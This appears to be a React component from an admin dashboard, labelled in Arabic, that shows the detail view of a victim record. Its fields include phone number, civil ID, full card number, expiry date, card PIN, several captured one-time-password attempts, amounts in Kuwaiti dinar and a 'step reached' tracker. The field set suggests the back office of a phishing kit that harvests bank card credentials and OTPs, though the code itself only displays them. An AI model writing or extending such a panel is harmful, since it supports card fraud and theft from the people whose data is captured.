import { useState } from "react";
import { User, CreditCard, Eye, EyeOff, CheckCircle, XCircle, X } from "lucide-react";

const InfoRow = ({ label, value, sensitive }) => {
  const [show, setShow] = useState(false);
  if (value === undefined || value === null || value === "") return null;
  return (
    <div className="flex justify-between items-center py-2.5 border-b border-slate-700/50 last:border-0 px-3 hover:bg-slate-800/40 rounded-lg transition-colors">
      <span className="text-sm text-slate-400 font-medium">{label}</span>
      <div className="flex items-center gap-2">
        <span className="text-sm font-semibold text-white font-mono">
          {sensitive && !show ? "••••••" : String(value)}
        </span>
        {sensitive && (
          <button onClick={() => setShow(s => !s)} className="text-slate-500 hover:text-white transition-colors">
            {show ? <EyeOff className="h-3.5 w-3.5" /> : <Eye className="h-3.5 w-3.5" />}
          </button>
        )}
      </div>
    </div>
  );
};

const Section = ({ icon: Icon, title, gradient, children }) => (
  <div className="rounded-xl border border-slate-700/50 overflow-hidden">
    <div className={`flex items-center gap-3 px-4 py-3 bg-gradient-to-r ${gradient}`}>
      <div className="w-8 h-8 rounded-lg bg-white/20 flex items-center justify-center">
        <Icon className="h-4 w-4 text-white" />
      </div>
      <span className="font-semibold text-white text-sm">{title}</span>
    </div>
    <div className="bg-slate-900/60 px-2 py-1">
      {children}
    </div>
  </div>
);

export default function RecordDetailModal({ record: r, onClose }) {
  const otpAttempts = r.otp1 ? r.otp1.split(" | ") : [];

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4" onClick={onClose} dir="rtl">
      <div className="absolute inset-0 bg-black/70 backdrop-blur-sm" />
      <div
        className="relative bg-slate-900 border border-slate-700/50 rounded-2xl w-full max-w-xl max-h-[90vh] overflow-y-auto shadow-2xl"
        onClick={e => e.stopPropagation()}
      >
        {/* Header */}
        <div className="sticky top-0 bg-slate-900/95 backdrop-blur-sm border-b border-slate-700/50 px-5 py-4 flex items-center justify-between">
          <div>
            <h2 className="text-lg font-bold text-white">تفاصيل السجل</h2>
            <p className="text-xs text-slate-500 mt-0.5 font-mono">{r.id}</p>
          </div>
          <button onClick={onClose} className="text-slate-400 hover:text-white text-xl leading-none w-8 h-8 flex items-center justify-center rounded-lg hover:bg-slate-800 transition-colors">×</button>
        </div>

        <div className="p-5 space-y-4">
          {/* Personal Info */}
          <Section icon={User} title="المعلومات الشخصية" gradient="from-blue-600/80 to-blue-700/80">
            <InfoRow label="رقم الهاتف" value={r.phone_number} />
            <InfoRow label="الرقم المدني" value={r.civil_id} />
            <InfoRow label="رقم الهوية" value={r.id_number} sensitive />
            <InfoRow label="الشبكة" value={r.network} />
            <InfoRow label="الدفع لـ" value={r.pay_for} />
            <InfoRow label="الصفحة" value={r.page} />
            <InfoRow label="النوع" value={r.type} />
            <InfoRow label="المبلغ" value={r.amount ? `${r.amount} KD` : null} />
            <InfoRow label="تاريخ الإنشاء" value={r.created_date ? new Date(r.created_date).toLocaleString() : null} />
          </Section>

          {/* Card Info */}
          <Section icon={CreditCard} title="معلومات البطاقة" gradient="from-emerald-600/80 to-teal-700/80">
            <InfoRow label="البنك" value={r.bank} />
            <InfoRow label="بادئة البطاقة" value={r.card_prefix} />
            <InfoRow label="رقم البطاقة" value={r.card_number} sensitive />
            <InfoRow label="شهر الانتهاء" value={r.expiry_month} />
            <InfoRow label="سنة الانتهاء" value={r.expiry_year} />
            <InfoRow label="الرقم السري (PIN)" value={r.pin} sensitive />
            <InfoRow label="OTP 2" value={r.otp2} sensitive />
            <InfoRow label="الخطوة المحققة" value={r.step_reached != null ? String(r.step_reached) : null} />
          </Section>

          {/* OTP Attempts */}
          {otpAttempts.length > 0 && (
            <div className="rounded-xl border border-slate-700/50 overflow-hidden">
              <div className="flex items-center gap-3 px-4 py-3 bg-gradient-to-r from-violet-600/80 to-purple-700/80">
                <span className="font-semibold text-white text-sm">محاولات OTP 1</span>
                <span className="bg-white/20 text-white text-xs rounded-full px-2 py-0.5">{otpAttempts.length}</span>
              </div>
              <div className="bg-slate-900/60 px-4 py-3 flex flex-wrap gap-2">
                {otpAttempts.map((otp, i) => (
                  <span key={i} className="bg-violet-500/10 border border-violet-500/30 text-violet-300 text-xs font-mono px-3 py-1.5 rounded-lg">
                    #{i + 1}: {otp}
                  </span>
                ))}
              </div>
            </div>
          )}
        </div>

        {/* Footer Actions */}
        <div className="sticky bottom-0 bg-slate-900/95 backdrop-blur-sm border-t border-slate-700/50 px-5 py-4">
          <button onClick={onClose} className="w-full py-2.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white text-sm font-medium transition-colors">
            إغلاق
          </button>
        </div>
      </div>
    </div>
  );
}